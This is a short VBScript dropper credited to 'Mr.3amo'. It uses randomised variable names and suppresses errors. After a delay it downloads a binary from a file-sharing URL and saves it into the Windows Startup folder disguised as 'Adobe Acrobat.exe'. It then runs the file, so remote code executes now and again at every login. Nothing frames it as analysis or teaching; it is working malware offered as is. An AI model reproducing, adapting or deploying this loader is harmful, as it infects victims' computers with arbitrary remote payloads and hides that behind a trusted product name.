'<<< Coded By Mr.3amo>>> 
Set PJwUJyOG = CreateObject("WScript.Shell")
GqaHmDhC = PJwUJyOG.SpecialFolders("Startup") & "\Adobe Acrobat.exe"
'<<<<<<<<<<< code start >>>>>>>>>>>
On Error Resume Next
wscript.sleep 3000
call coztlHsl("https://dropmb.com/api/shares/jdma/files/b497a432-064e-411a-944c-bf8d911a4e04",GqaHmDhC)
sub coztlHsl(sitelink,filename)
dim lqVHEwSP
Set lqVHEwSP = createobject("msxml2.xmlhttp")
dim gGgcqtLb
Set gGgcqtLb = createobject("Adodb.Stream")
lqVHEwSP.Open "GET", sitelink, False
lqVHEwSP.Send
with gGgcqtLb
.type = 1
.open
.write lqVHEwSP.responseBody
.savetofile FileName , 2
 end with
end sub
PJwUJyOG.Exec (GqaHmDhC)
